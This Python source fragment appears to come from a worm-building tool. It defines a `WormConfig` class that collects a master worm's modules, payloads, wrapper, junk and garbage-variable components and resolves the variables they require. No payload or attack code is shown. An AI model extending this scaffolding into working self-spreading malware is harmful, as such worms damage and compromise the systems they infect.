    def old_show_all(self, display: bool = True) -> Union[str, None]:
        if not self.raw_worm.master_worm:
            self.msg("error", "[!!] Worm is empty. First add a worm to template [!!]")
            return
        self.show_worm2()
        return
        text = self.show_help()
        text += self.show_worm()
        text += self.show_modules()
        text += self.show_payloads()
        text += self.show_reqPayloads()
        text += self.show_var()
        text += self.show_reqVar()
        text += self.show_garbageVar()
        text += self.show_reqFood()
        text += self.show_shadow()
        text += self.show_starter()
        text += self.show_wrapper()
        text += self.show_compiler()
        text += self.show_process()

        if display:
            self.msg("msg", text)
        else:
            return text





class WormConfig:
    def __init__(self, worm_builder: object):
        self.wb = worm_builder
        self.master_worm = None
        self.modules = {}
        self.support = {}
        self.payloads = {}
        self.shadow = {}
        self.starter = None
        self.junks = {}
        self.wrapper = None
        self._var = {}
        self.food = {}
        self.process = None
        self.garbageVar = {}
        self._globalVar = {}
        self.cscript = None
        self.sfiles = {}
        self.scode = None
    
    
    @property
    def banned(self) -> list:
        if not self.master_worm:
            return []
        else:
            return self.master_worm.banned
    
    @property
    def all_modules(self) -> list:
        mods = []
        if not self.master_worm:
            return []
        mods.append(self.master_worm)
        for m in self.modules.values():
            mods.append(m)
        for s in self.support.values():
            mods.append(s)
        for p in self.payloads.values():
            mods.append(p)
        for sh in self.shadow.values():
            mods.append(sh)
        if self.starter:
            mods.append(self.starter)
        for j in self.junks.values():
            mods.append(j)
        if self.wrapper:
            mods.append(self.wrapper)
        if self.cscript:
            mods.append(self.cscript)
        if self.scode:
            mods.append(self.scode)
        for sf in self.sfiles.values():
            mods.append(sf)
        return mods

    @property
    def var(self) -> dict:
        var = self._var
        for mod in self.all_modules:
            for name, var_object in mod.setVar.items():
                var[name] = var_object
            # check in reqVar
            for name, var_object in mod.reqVar.items():
                if not var_object.reqVar_FLAG and not name in var.keys():
                    var[name] = var_object
                    
        return var


    @property
    def reqVar(self) -> dict:
        var = self.var.copy()
        rv = {}
        for mod in self.all_modules:
            for name, req_var in mod.reqVar.items():
                if name in var.keys():
                    continue
                rv[name] = req_var
        return rv
    
    @property
    def reqSMod(self) -> list:
        rs = []
        for mod in self.all_modules:
            for rm in mod.reqSMod:
                if not rm in rs or not rm in self.support.keys():
                    rs.append(rm)
        return rs
    
    @property
    def reqMod(self) -> list:
        req = []
        for mod in self.all_modules:
            for rm in mod.reqMod:
                if not rm in req or not rm in self.modules.keys():
                    req.append(rm)
        return req
    
    @property
    def reqPayload(self) -> dict:
        req = {}
        for mod in self.all_modules:
            for name, rp in mod.reqPayload.items():
                if name in self.payloads.keys():
                    continue

                req[name] = rp
        return req

    @property
    def globalVar(self) -> dict:
        gvar = {}
        for mod in self.all_modules:
            for name, var_item in mod.globalVar.items():
                gvar[name] = var_item.value
        gvar.update(self._globalVar)
        return gvar
    
    @property
    def globalVarWorm(self) -> list:
        gvar = []
        for mod in self.all_modules:
            for name, var_item in mod.globalVar.items():
                gvar.append((name, var_item.value, var_item.info))
        return gvar
    
    @property
    def reqFood(self) -> dict:
        var = self.var.copy()
        req = {}
        for mod in self.all_modules:
            for name, food_var in mod.reqFood.items():
                if name in var.keys():
                    continue
                req[name] = food_var
        return req
    
    @property
    def setVar(self) -> dict:
        var = self.var.copy()
        svar = {}
        for mod in self.all_modules:
            for name, sv in mod.setVar.items():
                if name in var.keys():
                    continue
                svar[name] = sv
        return svar


    def check_garbageVar(self) -> None:
        for mod in self.all_modules:
            for name, gv in mod.garbageVar.items():
                if name in self.garbageVar.keys():
                    continue
                self.garbageVar[name] = gv
    
    @property
    def accepted_modules(self) -> list:
        if not self.master_worm:
            return []
        return self.master_worm.acceptMods